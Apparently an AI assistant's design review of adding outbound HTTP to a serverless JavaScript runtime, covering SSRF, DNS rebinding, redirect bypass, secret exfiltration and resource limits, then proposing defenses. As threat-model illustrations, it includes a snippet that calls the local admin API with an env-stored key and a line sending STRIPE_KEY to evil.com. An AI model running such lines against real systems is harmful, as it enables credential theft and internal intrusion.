---
harness: claude-code
model: claude-opus-4-6
timestamp: 2026-02-06T11:15:00Z
replying_to: 01_analysis.md
---

# fazt.http — Deep Analysis & Response

Codex's analysis is solid and well-grounded in the actual codebase. I've read through
`runtime.go`, `handler.go`, `budget.go`, `writer.go`, the proxy spec, and capacity docs.
Here's my point-by-point deep analysis.

---

## 1. Security Analysis — In Depth

### 1.1 SSRF (Server-Side Request Forgery)

**Codex said:** Without egress control, serverless can hit localhost, RFC1918, metadata IPs.

**Deep analysis:**

This is the #1 risk. Here's the attack surface, grounded in fazt's actual code:

```
handler.go:65  HandleRequest() → runs JS in Goja VM
runtime.go:106 Execute() → vm.RunString(code)
```

The Goja VM runs in the same Go process as the fazt server. If we add a naive
`http.Get()` binding, that HTTP call inherits the server's network identity:

**What's reachable from inside the fazt process:**
- `127.0.0.1:8080` — fazt's own HTTP server (admin API, all endpoints)
- `127.0.0.1:*` — any service on the host (databases, monitoring, SSH tunnels)
- `192.168.*.*` — entire local network
- `169.254.169.254` — cloud metadata (AWS/GCP/DO instance credentials)
- `fd00::/8` — IPv6 private ranges
- `[::1]` — IPv6 loopback

**Concrete attack on fazt:**
```javascript
// api/main.js — deployed by attacker (or bug in your code)
var res = fazt.net.fetch("http://127.0.0.1:8080/api/system/health", {
  headers: { "Authorization": "Bearer " + fazt.env.get("ADMIN_KEY") }
});
// Now has full admin access to the fazt instance FROM INSIDE
```

Even without the auth header, some internal endpoints might not require auth
when accessed from localhost (a common pattern in web frameworks).

**The fix is non-negotiable:**
A custom `net.Dialer` in Go that validates the resolved IP address BEFORE connecting:

```go
dialer := &net.Dialer{
    Control: func(network, address string, c syscall.RawConn) error {
        ip := parseIP(address)
        if isPrivate(ip) || isLoopback(ip) || isLinkLocal(ip) || isMetadata(ip) {
            return fmt.Errorf("blocked: %s is internal", address)
        }
        return nil
    },
}
```

This check happens at TCP connect time, AFTER DNS resolution. The IP is already
known. No TOCTOU race possible at this layer.

**IP ranges to block:**
- `127.0.0.0/8` — loopback
- `10.0.0.0/8` — private (class A)
- `172.16.0.0/12` — private (class B)
- `192.168.0.0/16` — private (class C)
- `169.254.0.0/16` — link-local (metadata lives here)
- `100.64.0.0/10` — CGNAT (shared ISP ranges)
- `::1/128` — IPv6 loopback
- `fc00::/7` — IPv6 unique-local
- `fe80::/10` — IPv6 link-local
- `0.0.0.0/8` — "this network" (can sometimes reach localhost)

---

### 1.2 DNS Rebinding / Redirect Bypass

**Codex said:** Allowlist by hostname alone can be bypassed via resolution changes or redirects.

**Deep analysis — two distinct attacks:**

**Attack A: DNS Rebinding**

1. Attacker controls `evil.com`
2. First DNS lookup: `evil.com` → `93.184.216.34` (a legit public IP)
3. Fazt proxy checks: "is `evil.com` allowed?" → Yes (if in open/denylist mode)
4. Fazt proxy checks: "is `93.184.216.34` private?" → No, it's public → OK
5. Connection established, then closes
6. Second request to same `evil.com`: DNS now returns `127.0.0.1`
7. If proxy uses cached DNS or doesn't re-check: connects to localhost

**Why this matters for fazt specifically:**
Go's `net/http` uses a connection pool. The first request validates, establishes
a connection, and the pool might reuse it. But DNS rebinding attacks usually target
the *next* connection. With Go's default DNS caching behavior, the fix is:

**Validate IP at connect time, every time.** The `Dialer.Control` function above
already handles this — it runs on every new TCP connection. As long as we DON'T
cache IP→hostname mappings ourselves, Go's stdlib handles this safely.

**Attack B: Redirect Chains**

1. App fetches `https://allowed-api.com/webhook`
2. That server responds: `302 Location: http://127.0.0.1:8080/api/secret`
3. Go's `http.Client` follows the redirect automatically
4. Now you've hit localhost

**The fix:**
```go
client := &http.Client{
    CheckRedirect: func(req *http.Request, via []*http.Request) error {
        // Re-validate the NEW target through the same rules:
        // 1. Is the new hostname allowed?
        // 2. Is it still HTTPS?
        // 3. Will the IP be checked at connect time? (yes, via Dialer)
        if !isAllowedHost(req.URL.Host) {
            return fmt.Errorf("redirect to disallowed host: %s", req.URL.Host)
        }
        if req.URL.Scheme != "https" {
            return fmt.Errorf("redirect to non-HTTPS: %s", req.URL.Scheme)
        }
        if len(via) >= maxRedirects {
            return fmt.Errorf("too many redirects")
        }
        return nil
    },
}
```

The key insight: **redirect validation + IP validation at connect time = defense in depth.**
Either layer alone has gaps. Together they close the TOCTOU window.

---

### 1.3 Secret Leakage (Exfiltration)

**Codex said:** If app code sees secrets, it can exfiltrate via outgoing requests.

**Deep analysis — how this maps to fazt's current code:**

Today in `handler.go:90`, env vars are loaded and injected:
```go
env := h.loadEnvVars(appID)  // Reads from env_vars table
// ...
InjectFaztNamespace(vm, app, env, result)  // Makes them available as fazt.env.get()
```

The JS code can currently do:
```javascript
var key = fazt.env.get("STRIPE_KEY");  // Returns the actual secret value
console.log(key);  // Logged to site_logs table
```

Adding `fazt.net.fetch` creates the exfiltration channel:
```javascript
var key = fazt.env.get("STRIPE_KEY");
fazt.net.fetch("https://evil.com/?key=" + key);  // Game over
```

**Codex's solution (secrets by reference) is the right architecture.**

Here's how it would work in fazt:

1. **New table**: `secrets` (separate from `env_vars`)
   - `env_vars` = non-sensitive config (APP_NAME, DEBUG, etc.) — visible to JS
   - `secrets` = sensitive credentials (API keys, tokens) — NEVER visible to JS

2. **Proxy injection**: When JS calls `fazt.net.fetch(url, { auth: 'STRIPE_KEY' })`:
   - The Go proxy looks up `STRIPE_KEY` in the secrets table
   - Injects `Authorization: Bearer sk_live_...` into the outgoing request
   - JS never sees the value — it only knows the name

3. **The gap**: `fazt.env.get()` still exists. If someone puts a secret in env_vars
   instead of secrets, they can still exfiltrate it. This is a UX problem, not a
   technical one. We should:
   - Document clearly: "env_vars = config, secrets = credentials"
   - Consider a migration/warning for env_vars that look like API keys (regex)
   - Log warnings when env_vars contain patterns like `sk_`, `Bearer`, etc.

**What about console.log exfiltration?**
Even without `fazt.net.fetch`, secrets in env_vars can leak via `console.log`:
```javascript
console.log(fazt.env.get("STRIPE_KEY"));
// → Stored in site_logs table, readable via admin API
```

This is a pre-existing risk. The secrets table solves it because secrets are never
accessible from JS at all.

---

### 1.4 Abuse / Resource Exhaustion

**Codex said:** Unbounded external calls can exhaust rate limits, costs, and capacity.

**Deep analysis — grounded in actual numbers:**

**Current capacity** (from `CAPACITY.md` + code):
- VM Pool: 100 Goja instances (`MaxPoolSize = 100` in runtime.go:18)
- Runtime timeout: 5s per execution (`DefaultTimeout` in runtime.go:17)
- Request budget: 10s (`RequestTimeout` in budget.go:20)
- Write queue: 1000 slots, ~800 ops/sec throughput
- Mixed request capacity: ~2,300 req/s

**The problem with external HTTP:**
A storage operation (kv.set, docs.insert) takes ~1ms.
An external HTTP call takes 200ms-5000ms.

That's 200x-5000x longer per operation.

**Scenario: 20 concurrent requests each making 1 external call (avg 2s)**
- 20 VMs blocked for 2s each = 20 VMs unavailable
- Pool is 100, so 20% capacity gone for 2 seconds
- During that 2s window, remaining 80 VMs handle all other traffic
- If those 80 VMs also get requests with external calls... cascade

**Scenario: 1 rogue app making rapid sequential fetches**
```javascript
for (var i = 0; i < 50; i++) {
    fazt.net.fetch("https://slow-api.com/" + i);  // 1s each = 50s total
}
```
This single request holds a VM for 50 seconds. With 5s timeout, it gets
interrupted at 5s. But if we raise the timeout for HTTP (to say 30s), it
holds the VM for 30s before interrupting.

**Key insight**: The timeout budget system (`budget.go`) was designed for
fast operations (storage ~1ms). External HTTP fundamentally changes the
time profile. We need a separate budget concept:

```
Current:  10s total → many fast ops (1ms each)
With HTTP: 10s total → 1-2 slow ops (2-5s each) + a few fast ops
```

**The right limits:**
- Max 3-5 external calls per request (hard limit in the proxy)
- Per-call timeout: 5s default, configurable up to 30s
- Total HTTP budget per request: 10s (separate from storage budget)
- Per-app concurrency: max 5 simultaneous outbound connections
- Global concurrency: max 20 simultaneous outbound connections
- This means at worst, 20 VMs blocked = 20% pool, bounded

---

## 2. Async Shims — Architecture

**User preference: build with async shims.**
**Codex said: sync is lowest-risk, Promise support would be large scope increase.**

I agree with the user. Here's why and how:

### Why Async Shims

1. **API stability**: The proxy spec (`proxy.md`) already uses `await` syntax.
   If we ship sync-only now, every app needs rewriting when we add async.

2. **Developer expectations**: Every JS developer knows `fetch()` returns a Promise.
   A sync `fetch()` that returns the response directly is surprising.

3. **Future-proofing**: When we upgrade to a runtime with native async (Goja+,
   QuickJS, V8 isolates), the app code doesn't change.

4. **It's not actually hard**: We don't need a real event loop. We need a
   *synchronous Promise shim* — a Promise that resolves immediately because
   the Go side blocks until the HTTP call completes.

### How It Works

**The trick**: Goja supports ES6+ syntax including Promises. What it lacks is
an event loop to schedule microtasks. But we don't need one because our
"async" operations complete synchronously on the Go side.

```
JS: var p = fazt.net.fetch(url)     // Returns a Promise
    ↓
Go: Makes HTTP request (blocking)    // 2 seconds pass
Go: Creates resolved Promise          // With the response
    ↓
JS: p.then(function(res) { ... })    // Runs immediately (already resolved)
JS: var data = res.json()            // Sync helper on response object
```

**Implementation approach — "sync-resolved Promises":**

```go
func makeFetch(vm *goja.Runtime, proxy *EgressProxy) func(goja.FunctionCall) goja.Value {
    return func(call goja.FunctionCall) goja.Value {
        url := call.Argument(0).String()
        opts := parseOptions(call)

        // Do the blocking HTTP call in Go
        resp, err := proxy.Execute(url, opts)

        // Return a Promise that's already resolved
        promise, resolve, reject := vm.NewPromise()
        if err != nil {
            reject(vm.NewGoError(err))
        } else {
            resolve(responseToJS(vm, resp))
        }
        return vm.ToValue(promise)
    }
}
```

**What this gives us:**

```javascript
// Style 1: .then() chains (works today)
fazt.net.fetch("https://api.stripe.com/charges", {
    method: "POST",
    auth: "STRIPE_KEY",
    body: JSON.stringify({ amount: 1000 })
}).then(function(res) {
    return res.json();
}).then(function(data) {
    return respond({ charge: data.id });
});

// Style 2: Direct use (Promise resolves synchronously, so .json() works inline)
// This is a convenience pattern — the Promise is already resolved by the time
// JS continues execution, so you can technically do:
var res = fazt.net.fetch("https://api.example.com/data");
// res is a Promise, but...
```

**Important caveat**: Without async/await syntax support in Goja, users can't do:
```javascript
var res = await fazt.net.fetch(url);  // Requires async/await parser support
```

**Two options to bridge this gap:**

**Option A: Sync wrapper + Promise return (recommended for Phase 1)**
```javascript
// fazt.net.fetch() → Promise (for .then() chains)
// fazt.net.fetchSync() → direct response object (for simplicity)

// Simple use:
var res = fazt.net.fetchSync("https://api.example.com/data");
var data = res.json();

// Promise use:
fazt.net.fetch(url).then(function(res) { ... });
```

**Option B: Lightweight async/await transpiler**
Run a simple transform on the JS source before execution:
`async function` → `function`, `await expr` → `expr.__awaitSync()`
This is fragile and adds complexity. Not recommended for Phase 1.

### Recommendation

**Phase 1**: Ship both `fazt.net.fetch()` (returns Promise) and `fazt.net.fetchSync()`
(returns response directly). Document `fetchSync()` as the simple path and `.fetch()`
as the forward-compatible path.

**Phase 2**: When we add async/await support (runtime upgrade), deprecate `fetchSync()`.
All existing `.then()` code works unchanged. New code can use `await`.

---

## 3. Performance Deep Dive

### 3.1 Timeout Mismatch

**Codex identified:**
- `DefaultTimeout = 5s` (runtime.go:17) — Goja interrupt timer
- `RequestTimeout = 10s` (budget.go:20) — handler context deadline

**What actually happens** (traced through handler.go):

```
handler.go:108  execCtx = context.WithTimeout(ctx, 10s)  // 10s deadline
handler.go:110  budget = NewBudget(execCtx, cfg)           // budget knows 10s
handler.go:112  executeWithFazt(execCtx, ...)
                  ↓
runtime.go:482  ExecuteWithInjectors(ctx=execCtx, ...)
                  ↓
runtime.go:498  timeoutCtx = context.WithTimeout(ctx, 5s)  // 5s deadline (INNER)
runtime.go:509  vm.Interrupt("execution timeout")           // fires at 5s
```

The inner 5s timeout wins. The Goja VM gets interrupted at 5s even though
the handler allows 10s. The extra 5s is for post-execution work (log persistence,
response writing).

**For HTTP calls, this is a problem:**
- External HTTP call starts at t=0
- At t=5s: Goja interrupt fires → VM stops → HTTP call in progress gets cancelled
- The 5s limit applies to ALL JS execution, not per-operation

**If an app does storage + HTTP:**
```javascript
fazt.storage.kv.set("key", "value");  // ~5ms
var res = fazt.net.fetchSync(url);     // starts at t=5ms, has 4.995s left
var data = res.json();
fazt.storage.kv.set("result", data);   // ~5ms if there's time
```

This is actually fine for single-call patterns. The problem is multi-call:
```javascript
var a = fazt.net.fetchSync(url1);  // 2s
var b = fazt.net.fetchSync(url2);  // 2s — starts at t=2s, finishes at t=4s
var c = fazt.net.fetchSync(url3);  // 2s — starts at t=4s, INTERRUPTED at t=5s
```

**Recommendation:**
- Don't change `DefaultTimeout`. 5s is a good hard limit for serverless.
- Add a `NetBudget` concept alongside the existing `StorageBudget`:
  - Max HTTP time per request: configurable, default 5s
  - Max calls per request: 3-5
  - Each call gets: `min(remaining_budget / 2, per_call_limit)`
  - Same admission control pattern as `budget.StorageContext()`

### 3.2 Write Queue Pressure

**Codex said:** Proxy logs + cache writes will consume the SQLite write budget.

**Actual numbers:**

Write queue: 1000 slots, ~800 ops/sec (`writer.go`, `CAPACITY.md`)

If every external HTTP call generates:
- 1 log write (method, url, status, latency) = 1 write op
- 1 cache write (if caching enabled) = 1 write op

At 100 external calls/sec (modest load):
- 100 log writes = 12.5% of write budget
- 100 cache writes = 12.5% of write budget
- Total: 25% of write budget consumed by proxy overhead

At 500 calls/sec (heavy load):
- 1000 writes/sec from proxy alone > 800 ops/sec capacity
- **Write queue saturates. App storage operations start failing with 503.**

**This is a real problem.** Codex is right.

**Mitigation strategies (pick 2-3):**

1. **Async log writes (non-blocking)**
   Don't go through the WriteQueue for proxy logs. Use a separate
   batch writer that buffers and writes in bulk:
   ```go
   // Accumulate logs in memory, flush every 1s or every 100 entries
   proxyLogBuffer.Add(logEntry)  // non-blocking, in-memory
   // Background goroutine: INSERT batch every second
   ```
   This removes proxy logs from the write budget entirely.

2. **Log sampling**
   Only log 1-in-N requests for high-volume domains:
   - First 10 requests to a new domain: always log
   - After that: log 10% (configurable)
   - Errors: always log

3. **Cache in memory first, persist lazily**
   Use an in-memory LRU cache with periodic SQLite persistence:
   ```
   fetch() → check memory cache → check SQLite cache → make request
   response → store in memory cache → async persist to SQLite (if TTL > 5min)
   ```
   Short-TTL caches (<5min) never hit SQLite at all.

4. **Skip logging for cached responses**
   A cache hit means no external call was made. Don't log it.

**Recommendation:** Option 1 (async batch writer) + Option 3 (memory-first cache)
+ Option 4 (skip cache-hit logs). This makes the write pressure from proxy
effectively zero under normal operation.

### 3.3 Memory Risk

**Codex said:** Large responses fully read into memory can spike RAM and GC.

**Context:** Fazt runs on a $6 VPS with 1GB RAM, stable at ~60MB under load.

If an app fetches a 50MB response (the default `maxResponseBodySize` from the spec):
- 50MB allocated for the response body
- Goja VM copies it to JS string: another ~50MB (JS strings are UTF-16, could be 2x)
- Peak: 100-150MB for a single request
- With 3-4 concurrent large fetches: 400-600MB → OOM on 1GB VPS

**The spec says 50MB max response. That's too high for a $6 VPS.**

**Recommendation:**
- Default `maxResponseBodySize`: 1MB (covers 99% of API responses)
- Configurable up to 10MB per-app
- Global hard cap: 10MB (never higher)
- Read responses with `io.LimitReader` — stop reading after limit, not after OOM
- For large responses, return a truncated response + warning header

---

## 4. Implementation — What I'd Change from Codex's Plan

Codex's 4-phase plan is sensible. Here's what I'd adjust:

### Phase 1 Should Be Smaller

Codex's Phase 1 includes:
- fetch API ✓
- Allowlist-only ✓
- IP blocking ✓
- Timeouts + size caps ✓
- Minimal logging ✓

**I'd remove** logging from Phase 1 entirely. Logging adds write pressure
complexity. For Phase 1, use Go's stdlib logger (stdout) — it's visible in
`journalctl` and has zero SQLite cost. Add structured DB logging in Phase 3.

**I'd add** to Phase 1:
- Both `fetch()` (Promise) and `fetchSync()` (direct) APIs
- Per-request call limit (max 5)
- The `NetBudget` concept in timeout/budget.go

### Phase 2 Feels Right

Rate limiting, secrets store, redirect validation, HTTPS enforcement.
These are all "hardening" and belong together.

### Merge Phase 3 and 4

Cache and logging can ship together. By Phase 3 the proxy is battle-tested
and we understand the write pressure patterns from real usage. The sandbox
parity stuff is just wiring — not a separate phase.

---

## 5. Answering Open Questions

### Default policy: allowlist-only vs denylist vs open?

**Allowlist-only.** No question. Fazt is sovereign compute — the owner should
explicitly opt-in to each external service. This matches the "closed by default"
philosophy. Add domains via CLI:
```bash
fazt net allow add api.stripe.com
fazt net allow add api.openai.com
```

### Secret storage: table schema, rotation, access control?

New table, not an extension of `env_vars`:

```sql
CREATE TABLE secrets (
    id TEXT PRIMARY KEY,
    app_id TEXT,           -- NULL = global secret
    name TEXT NOT NULL,
    value TEXT NOT NULL,    -- encrypted at rest
    auth_mode TEXT DEFAULT 'bearer',
    domain TEXT,           -- optional: only inject for this domain
    created_at INTEGER,
    updated_at INTEGER,
    UNIQUE(app_id, name)
);
```

Rotation: update the value, existing references keep working.
Access: secrets are never exposed via any API. Only the proxy reads them.
CLI: `fazt secret set STRIPE_KEY sk_live_...` (masks value in output)

### How much logging is acceptable?

Zero SQLite writes for logging in Phase 1. Stdout only.
Phase 3: async batch writer, sampled, ~50-100 writes/sec max overhead.

### Cache: per-app or global?

Global with app-namespaced keys. If two apps fetch the same weather API,
they share the cache. Saves external calls. The cache key includes the
auth reference (so app A's Stripe calls don't cache-hit for app B).

---

## 6. Summary of Positions

| Topic | Codex Position | My Position |
|-------|---------------|-------------|
| Sync vs async API | Sync only (lowest risk) | **Async shims** — Promise + fetchSync dual API |
| Phase 1 scope | fetch + allowlist + IP block + logging | Same minus logging, plus Promise API + NetBudget |
| Max response size | 50MB | **1MB default, 10MB hard cap** (VPS reality) |
| Logging in Phase 1 | Minimal metadata | **Stdout only** (zero write pressure) |
| Cache architecture | SQLite table | **Memory-first LRU** with lazy SQLite persist |
| Timeout alignment | Raise DefaultTimeout or use handler deadline | **Keep 5s**, add separate NetBudget |
| Secrets table | Implied | **Explicit schema** with encryption + domain scoping |

---

## Next Steps

If we're aligned on direction, I can produce:
1. A concrete Plan document (`koder/plans/plan-40-fazt-http.md`)
2. Phase 1 implementation spec with exact file changes
3. Test cases for SSRF, redirect, and timeout scenarios

Waiting for direction.
